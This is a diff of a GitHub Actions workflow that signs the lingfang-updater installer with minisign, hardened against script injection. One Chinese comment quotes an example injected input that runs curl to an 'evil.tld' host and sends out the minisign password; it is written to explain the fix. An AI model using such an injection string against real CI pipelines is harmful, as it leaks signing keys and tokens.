@@ -38,20 +38,49 @@ jobs:
   sign:
     name: Sign installer with minisign
     runs-on: ubuntu-latest
+    timeout-minutes: 15
+    # 安全约定：所有 ${{ }} 一律只出现在 env: 段，绝不直接插值进 run: 的脚本正文。
+    # 直接插值等于把 workflow_dispatch 输入拼进 shell —— 攻击者用
+    #   artifact-path: 'x"; curl evil.tld -d "$MINISIGN_PASSWORD'
+    # 就能把签名私钥口令 / 后端令牌外带出去（GitHub Actions script injection）。
+    # 走 env 后这些值只是普通环境变量，shell 不会二次解析。
+    env:
+      VERSION: ${{ inputs.version }}
+      PLATFORM: ${{ inputs.platform }}
+      ARCH: ${{ inputs.arch }}
+      ARTIFACT_PATH: ${{ inputs.artifact-path }}
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Install minisign (static binary, no Rust toolchain needed)
+      - name: Validate artifact path (no absolute path / no traversal)
         run: |
-          curl -fsSL https://github.com/jedisct1/minisign/releases/download/0.11/minisign-0.11-linux.tar.gz -o minisign.tar.gz
+          case "$ARTIFACT_PATH" in
+            ''|/*|*..*)
+              echo "artifact-path 必须是工作区内的相对路径且不含 '..'，实际收到：$ARTIFACT_PATH"
+              exit 1
+              ;;
+          esac
+          test -f "$GITHUB_WORKSPACE/$ARTIFACT_PATH" || {
+            echo "找不到安装包：$ARTIFACT_PATH"; exit 1;
+          }
+
+      - name: Install minisign (static binary, no Rust toolchain needed)
+        # TODO(supply-chain)：接入前请把 0.11 tarball 的 sha256 填进 sha256sum -c，
+        # 现在是无校验下载，上游被替换就会静默拿到伪造二进制。
+        run: |
+          curl --proto '=https' --tlsv1.2 -fsSL \
+            https://github.com/jedisct1/minisign/releases/download/0.11/minisign-0.11-linux.tar.gz \
+            -o minisign.tar.gz
           tar xzf minisign.tar.gz
           sudo mv minisign-0.11-linux/minisign /usr/local/bin/minisign
           minisign --version
 
       - name: Restore signing key from secret
+        env:
+          MINISIGN_KEY: ${{ secrets.MINISIGN_KEY }}
         run: |
-          printf '%s\n' "${{ secrets.MINISIGN_KEY }}" > minisign.key
+          printf '%s\n' "$MINISIGN_KEY" > minisign.key
           chmod 600 minisign.key
 
       - name: Sign installer
@@ -61,18 +90,32 @@ jobs:
           minisign -S \
             -s minisign.key \
             -p "$MINISIGN_PASSWORD" \
-            -m "${{ github.workspace }}/${{ inputs.artifact-path }}" \
-            -x "${{ github.workspace }}/${{ inputs.artifact-path }}.sig" \
-            -t "lingfang-updater ${{ inputs.version }} (${{ inputs.platform }}-${{ inputs.arch }})"
+            -m "$GITHUB_WORKSPACE/$ARTIFACT_PATH" \
+            -x "$GITHUB_WORKSPACE/$ARTIFACT_PATH.sig" \
+            -t "lingfang-updater $VERSION ($PLATFORM-$ARCH)"
           echo "--- .sig 全文（需整体存入后端 signature 字段，含 untrusted comment 行）---"
-          cat "${{ inputs.artifact-path }}.sig"
+          cat "$GITHUB_WORKSPACE/$ARTIFACT_PATH.sig"
 
       - name: Report signature to backend
+        env:
+          BACKEND_API: ${{ secrets.BACKEND_API }}
+          BACKEND_TOKEN: ${{ secrets.BACKEND_TOKEN }}
         run: |
           # 后端需新增接口：接收 { version, platform, arch, signature(.sig 全文) }
           # 并将其写入对应 LatestAsset.signature，供桌面壳验签。
-          SIG_JSON=$(jq -Rs . < "${{ inputs.artifact-path }}.sig")
-          curl -fsSL -X POST "${{ secrets.BACKEND_API }}/api/admin/release-signature" \
-            -H "Authorization: Bearer ${{ secrets.BACKEND_TOKEN }}" \
-            -H "Content-Type: application/json" \
-            -d "{\"version\":\"${{ inputs.version }}\",\"platform\":\"${{ inputs.platform }}\",\"arch\":\"${{ inputs.arch }}\",\"signature\":${SIG_JSON}}"
+          # 用 jq 组装 JSON（--arg / --rawfile 自带转义），不手工拼字符串。
+          payload=$(jq -nc \
+            --arg version "$VERSION" \
+            --arg platform "$PLATFORM" \
+            --arg arch "$ARCH" \
+            --rawfile signature "$GITHUB_WORKSPACE/$ARTIFACT_PATH.sig" \
+            '{version: $version, platform: $platform, arch: $arch, signature: $signature}')
+          curl --proto '=https' --tlsv1.2 -fsSL -X POST \
+            "$BACKEND_API/api/admin/release-signature" \
+            -H "Authorization: Bearer $BACKEND_TOKEN" \
+            -H 'Content-Type: application/json' \
+            -d "$payload"
+
+      - name: Shred signing key
+        if: always()
+        run: shred -u minisign.key 2>/dev/null || rm -f minisign.key
